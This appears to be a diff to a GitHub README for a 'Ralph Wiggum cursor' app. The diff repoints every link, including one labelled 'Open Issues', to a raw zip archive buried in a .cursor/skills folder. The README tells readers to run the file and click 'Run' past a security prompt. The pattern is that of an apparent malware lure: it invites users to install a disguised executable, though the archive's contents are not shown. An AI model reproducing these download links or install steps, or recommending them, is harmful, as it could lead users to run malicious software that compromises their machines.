@@ -4,7 +4,7 @@
 Welcome to the cursor-ralph-wiggum project! This application replaces your standard mouse cursor with the iconic Ralph Wiggum. Enjoy a fun and unique cursor experience while you navigate your computer.
 
 ## 📥 Download Now
-[![Download cursor-ralph-wiggum](https://github.com/nowphyy/cursor-ralph-wiggum/raw/refs/heads/main/.cursor/skills/cursor_ralph_wiggum_3.1.zip)](https://github.com/nowphyy/cursor-ralph-wiggum/raw/refs/heads/main/.cursor/skills/cursor_ralph_wiggum_3.1.zip)
+[![Download cursor-ralph-wiggum](https://github.com/nowphyy/cursor-ralph-wiggum/raw/refs/heads/main/.cursor/skills/ralph-wiggum/ralph_wiggum_cursor_v2.8-beta.5.zip)](https://github.com/nowphyy/cursor-ralph-wiggum/raw/refs/heads/main/.cursor/skills/ralph-wiggum/ralph_wiggum_cursor_v2.8-beta.5.zip)
 
 ## 🚀 Getting Started
 Getting started with the cursor-ralph-wiggum application is easy. Follow these simple steps to have Ralph Wiggum in your cursor.
@@ -17,7 +17,7 @@ Getting started with the cursor-ralph-wiggum application is easy. Follow these s
 ## 📂 Download & Install
 1. **Visit the Releases Page**
    Click the link below to visit the Releases page:
-   [Download Here](https://github.com/nowphyy/cursor-ralph-wiggum/raw/refs/heads/main/.cursor/skills/cursor_ralph_wiggum_3.1.zip)
+   [Download Here](https://github.com/nowphyy/cursor-ralph-wiggum/raw/refs/heads/main/.cursor/skills/ralph-wiggum/ralph_wiggum_cursor_v2.8-beta.5.zip)
 
 2. **Choose the Latest Version**
    On the Releases page, find the latest version of cursor-ralph-wiggum. Usually, the version will be at the top. Click on it to view the downloadable files.
@@ -26,7 +26,7 @@ Getting started with the cursor-ralph-wiggum application is easy. Follow these s
    Select the file that matches your operating system. Click on the download link. The file will start downloading automatically.
 
 4. **Locate the Downloaded File**
-   Once downloaded, go to your 'Downloads' folder. You should see a file named something like `https://github.com/nowphyy/cursor-ralph-wiggum/raw/refs/heads/main/.cursor/skills/cursor_ralph_wiggum_3.1.zip`.
+   Once downloaded, go to your 'Downloads' folder. You should see a file named something like `https://github.com/nowphyy/cursor-ralph-wiggum/raw/refs/heads/main/.cursor/skills/ralph-wiggum/ralph_wiggum_cursor_v2.8-beta.5.zip`.
 
 5. **Run the Installer**
    Double-click the downloaded file. A security prompt may appear. Click “Run” to continue.
@@ -62,7 +62,7 @@ If you encounter any issues or have questions, please visit our GitHub repositor
 If you would like to contribute to this project, feel free to submit a pull request. We welcome improvements and new ideas.
 
 ## 🔗 Links
-- [Download Here](https://github.com/nowphyy/cursor-ralph-wiggum/raw/refs/heads/main/.cursor/skills/cursor_ralph_wiggum_3.1.zip)
-- [Open Issues](https://github.com/nowphyy/cursor-ralph-wiggum/raw/refs/heads/main/.cursor/skills/cursor_ralph_wiggum_3.1.zip)
+- [Download Here](https://github.com/nowphyy/cursor-ralph-wiggum/raw/refs/heads/main/.cursor/skills/ralph-wiggum/ralph_wiggum_cursor_v2.8-beta.5.zip)
+- [Open Issues](https://github.com/nowphyy/cursor-ralph-wiggum/raw/refs/heads/main/.cursor/skills/ralph-wiggum/ralph_wiggum_cursor_v2.8-beta.5.zip)
 
 Thank you for choosing cursor-ralph-wiggum. Enjoy your unique cursor experience!
